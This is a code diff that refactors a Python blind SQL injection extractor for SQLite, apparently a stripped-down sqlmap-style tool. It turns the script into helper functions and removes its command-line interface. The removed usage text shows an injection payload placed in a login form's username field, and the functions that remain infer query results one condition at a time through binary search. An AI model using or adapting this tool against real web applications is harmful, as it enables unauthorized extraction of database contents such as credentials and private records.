@@ -1,12 +1,10 @@
-#!/usr/bin/env python3
-"""
-Simple boolean-based blind SQLi extractor (SQLite focused)
-"""
+"""Boolean-based blind SQLi extraction helpers for SQLite."""
 
-import argparse
 import sys
 
 import requests
+
+MAX_OUT_LENGTH = 80
 
 # ----------------------------
 # Core request + evaluation
@@ -76,7 +74,7 @@ def request_options(args):
 
 def get_length(query, args):
     print(f"[*] Determining length of: {query}")
-    low, high = 0, args.max_length
+    low, high = 0, getattr(args, "max_length", MAX_OUT_LENGTH)
     length = 0
 
     while low <= high:
@@ -155,92 +153,3 @@ def evaluate(cond, args):
         true_status=args.true_status,
         false_string=args.false_string,
     )
-
-
-# ----------------------------
-# CLI
-# ----------------------------
-
-
-def main():
-    parser = argparse.ArgumentParser(
-        description="Simple boolean-based blind SQLi extractor (SQLite focused)",
-        formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Example:
-
-  python simple_sqlmap.py -u "http://target/login" -m POST \\
-      --data "username={payload}&password=x" \\
-      --payload "' OR ({cond}) --" \\
-      --true-string "Welcome" \\
-      --query "SELECT sqlite_version()"
-        """,
-    )
-
-    parser.add_argument(
-        "-u",
-        "--url",
-        required=True,
-        help="Target URL. Use * as injection marker for GET.",
-    )
-    parser.add_argument(
-        "-m", "--method", default="GET", choices=["GET", "POST"], help="HTTP method"
-    )
-    parser.add_argument("-d", "--data", help="POST data with {payload} placeholder")
-    parser.add_argument(
-        "--payload",
-        required=True,
-        help="Payload template. Use {cond} for the condition.",
-    )
-    parser.add_argument(
-        "--query",
-        required=True,
-        help="SQL query to extract (e.g. SELECT sqlite_version())",
-    )
-
-    # Boolean options
-    parser.add_argument("--true-string", help="String present when condition is true")
-    parser.add_argument("--false-string", help="String present when condition is false")
-    parser.add_argument(
-        "--true-status",
-        type=int,
-        default=200,
-        help="HTTP status that means true (default: 200)",
-    )
-
-    # General
-    parser.add_argument("--headers", nargs="*", help="Extra headers (Header: Value)")
-    parser.add_argument("--cookies", help="Cookies (name=value; name2=value2)")
-    parser.add_argument(
-        "--timeout", type=float, default=15, help="Request timeout in seconds"
-    )
-    parser.add_argument(
-        "--max-length",
-        type=int,
-        default=80,
-        help="Maximum expected length of the result",
-    )
-    args = parser.parse_args()
-
-    if not (args.true_string or args.true_status or args.false_string):
-        print(
-            "[!] Boolean extraction requires --true-string, --true-status "
-            "or --false-string"
-        )
-        sys.exit(1)
-
-    if "{cond}" not in args.payload:
-        print("[!] Payload must contain the {cond} placeholder")
-        sys.exit(1)
-    print(f"[*] Target      : {args.url}")
-    print("[*] Technique   : boolean")
-    print(f"[*] Query       : {args.query}")
-    print("-" * 55)
-
-    result = extract_string(args.query, args)
-    print("-" * 55)
-    print(f"[+] Extracted   : {result}")
-
-
-if __name__ == "__main__":
-    main()
